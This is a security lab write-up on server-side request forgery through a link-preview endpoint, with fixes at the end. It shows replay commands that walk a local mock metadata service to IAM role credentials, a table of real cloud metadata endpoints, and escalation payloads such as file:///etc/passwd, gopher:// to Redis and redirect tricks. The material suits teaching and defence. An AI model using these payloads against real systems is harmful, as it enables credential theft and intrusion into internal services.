# Lab 25 — Link preview

## The bug

```python
with urllib.request.urlopen(url, timeout=4) as answer:
```

A URL from a stranger, fetched by a process that sits **inside** the network and
carries credentials the stranger does not have. That is the whole of SSRF: you
do not gain a new capability, you borrow the server's position.

What that position is worth:

* cloud instance metadata → role credentials → the account
* `127.0.0.1` services with no authentication because "only we can reach them"
* Kubernetes API, Consul, etcd, Redis, Elasticsearch, Docker socket
* internal admin panels, CI servers, dashboards
* other tenants' services on the same overlay network
* the network map itself, by timing and error differences

## The walk

Metadata services are trees. Read them like directories:

```bash
h5i browser open 'http://127.0.0.1:9250/api/preview?url=http://127.0.0.1:9251/' \
    --session lab25 --new --capture --allow 127.0.0.1

h5i websec replay req_0 --session lab25 --set query.url=http://127.0.0.1:9251/latest/meta-data/
h5i websec replay req_0 --session lab25 --set query.url=http://127.0.0.1:9251/latest/meta-data/iam/security-credentials/
h5i websec replay req_0 --session lab25 --set query.url=http://127.0.0.1:9251/latest/meta-data/iam/security-credentials/linkpreview-role
```

The real addresses, worth memorising:

| Cloud | Endpoint |
| --- | --- |
| AWS (IMDSv1) | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| AWS (IMDSv2) | needs a `PUT` to `/latest/api/token` first — see below |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` + `Metadata-Flavor: Google` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` + `Metadata: true` |
| Alibaba | `http://100.100.100.100/latest/meta-data/` |
| Kubernetes | `https://kubernetes.default.svc/api/v1/namespaces/…` |

Two of those need a **header** the SSRF must be able to set, and one needs a
**non-GET method**. That is the practical difference between a
"fetch this URL" SSRF and a "proxy this request" SSRF, and it is the first
thing to establish: can you control the method, the headers, or only the URL?

## The `--allow` note

h5i checks every fetch against a policy. Opening a page grants that page's own
origin; the metadata service here is a *different* port, so a session that will
navigate to both takes `--allow 127.0.0.1`. This does not apply to the
application's own outbound fetch — that is the target's socket, not yours — but
it does apply the moment you navigate your own browser to the second service.

## Escalating past HTTP

An SSRF that reaches only `http://` is already serious. Ask whether it reaches
more:

* `file:///etc/passwd` — this lab's `urlopen` does
* `gopher://` — arbitrary bytes to any TCP port; the classic route to
  unauthenticated Redis (`gopher://127.0.0.1:6379/_SET%20...`), SMTP, or a
  Postgres socket
* `dict://`, `ftp://`, `ldap://` — banner-grab and simple protocol writes
* a redirect: fetch a URL you control that 302s to `file://` or an internal host,
  which defeats checks performed only on the *submitted* URL (Lab 26)

## The fix

* Do not fetch user-supplied URLs. Where the feature demands it, use an
  allowlist of destinations, not a blocklist of spellings (Lab 26).
* Resolve the hostname **yourself**, check the resulting IP against
  private/link-local/loopback ranges, and connect to that IP — closing the
  DNS-rebinding window between check and connect.
* Refuse redirects, or re-run the whole check on each hop.
* Allow only `http`/`https`.
* Egress-filter the workload so the process could not reach the metadata service
  even if it tried; require IMDSv2 (which needs a `PUT` and a header, and so
  survives a plain GET-only SSRF).

## h5i technique

`--set query.url=`, plus `--allow` when your own session must reach a second
origin.
